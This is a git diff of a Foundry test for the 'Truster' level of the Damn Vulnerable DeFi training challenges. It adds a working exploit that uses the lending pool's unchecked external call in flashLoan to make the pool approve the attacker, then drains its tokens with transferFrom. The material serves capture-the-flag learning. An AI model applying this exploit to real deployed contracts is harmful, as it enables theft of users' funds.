@@ -5,7 +5,9 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
-import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
+import {TrusterLenderPool, IERC20} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
+
+import "forge-std/console2.sol";
 
 contract Truster is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
@@ -37,6 +39,14 @@ contract Truster is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+
+        uint256 toWithdraw = dvt.balanceOf(address(trusterLenderPool));
+        bytes memory approveCalldata = abi.encodeWithSignature("approve(address,uint256)", attacker, toWithdraw);
+        address(trusterLenderPool).call(abi.encodeWithSignature("flashLoan(uint256,address,address,bytes)", 0, attacker, address(dvt), approveCalldata));
+        dvt.transferFrom(address(trusterLenderPool), attacker, toWithdraw);
+
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
